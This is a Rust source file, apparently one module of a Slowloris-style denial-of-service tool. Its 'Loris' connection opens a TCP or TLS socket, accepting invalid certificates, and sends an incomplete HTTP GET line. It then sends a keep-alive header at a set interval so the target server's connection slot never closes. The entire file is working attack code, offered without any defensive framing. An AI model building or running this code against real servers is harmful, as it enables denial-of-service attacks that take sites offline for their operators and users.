use log::warn;
use replace_with::replace_with_or_abort;
use std::{
    io::Write,
    time::{Duration, Instant},
};
use tcp_stream::{
    NativeTlsConnector, NativeTlsHandshakeError, NativeTlsMidHandshakeTlsStream, TcpStream,
};

#[derive(Debug)]
pub(crate) struct Loris {
    state: LorisState,
    interval: Duration,
}

#[derive(Debug)]
enum LorisState {
    ShakingHands(NativeTlsMidHandshakeTlsStream, Instant),
    Preambling(TcpStream),
    Active(TcpStream, Instant),
    Errored(String),
}

impl Loris {
    pub(crate) fn spawn(domain: &str, port: &str, use_tls: bool, interval: Duration) -> Loris {
        Loris {
            interval,
            state: Loris::create_connection(domain, port, use_tls, interval / 2),
        }
    }

    pub(crate) fn get_next_tick_time(self: &Self) -> Instant {
        match self.state {
            LorisState::Active(_, next_send_time) => next_send_time,
            LorisState::ShakingHands(_, next_shake_time) => next_shake_time,
            _ => Instant::now(),
        }
    }

    pub(crate) fn is_alive(self: &Self) -> bool {
        !self.is_dead()
    }

    pub(crate) fn is_dead(self: &Self) -> bool {
        matches!(self.state, LorisState::Errored(..))
    }

    pub(crate) fn tick(self: &mut Self, tick_time: Instant) {
        replace_with_or_abort(&mut self.state, |state| match state {
            LorisState::ShakingHands(stream, next_shake_time) if next_shake_time <= tick_time => {
                match stream.handshake() {
                    Err(NativeTlsHandshakeError::WouldBlock(mid_handshake)) => {
                        LorisState::ShakingHands(
                            mid_handshake,
                            tick_time + Duration::from_millis(100),
                        )
                    }
                    Err(err) => LorisState::Errored(format!("tls handshake failed: {err}")),
                    Ok(stream) => LorisState::Preambling(stream.into()),
                }
            }

            LorisState::Preambling(mut stream) => {
                match stream.write_all(b"GET /favicon.ico HTTP/1.1\r\n") {
                    Err(err) => LorisState::Errored(format!("sending preamble failed: {err}")),
                    Ok(_) => LorisState::Active(
                        stream,
                        tick_time + self.interval, // no need to send header immediately after preamble
                    ),
                }
            }

            LorisState::Active(mut stream, next_send_time) if next_send_time <= tick_time => {
                match stream.write_all(b"Connection: keep-alive;\r\n") {
                    Ok(_) => LorisState::Active(stream, tick_time + self.interval),
                    Err(err) => LorisState::Errored(format!(
                        "sending another header to keep connection alive failed: {err}"
                    )),
                }
            }

            // These states require no action per-tick
            x @ LorisState::ShakingHands(..) => x,
            x @ LorisState::Active(..) => x,
            x @ LorisState::Errored(_) => x,
        });

        if let LorisState::Errored(err) = &self.state {
            warn!("loris has died: {err}");
        }
    }

    fn create_connection(
        domain: &str,
        port: &str,
        use_tls: bool,
        connect_timeout: Duration,
    ) -> LorisState {
        let mut stream: TcpStream;

        let connect_stream =
            TcpStream::connect_timeout(format!("{domain}:{port}"), connect_timeout);

        if let Err(err) = connect_stream {
            return LorisState::Errored(format!("failed to connect to '{domain}:{port}': {err}"));
        } else {
            stream = connect_stream.unwrap();
        }

        let configure_stream = stream
            .set_nodelay(true)
            .and_then(|_| stream.set_nonblocking(true));

        if let Err(err) = configure_stream {
            return LorisState::Errored(format!("failed to configure connection: {err}"));
        }

        if use_tls {
            let connector = NativeTlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .build();

            if let Err(err) = connector {
                return LorisState::Errored(format!("failed to create tls connector: {err}"));
            }

            let tls_stream = connector.unwrap().connect(domain, stream);
            if let Err(NativeTlsHandshakeError::WouldBlock(mid_handshake)) = tls_stream {
                return LorisState::ShakingHands(
                    mid_handshake,
                    Instant::now() + Duration::from_millis(100),
                );
            } else if let Err(err) = tls_stream {
                return LorisState::Errored(format!("tls handshake failed: {err}"));
            }

            stream = tls_stream.unwrap().into()
        }

        LorisState::Preambling(stream)
    }
}
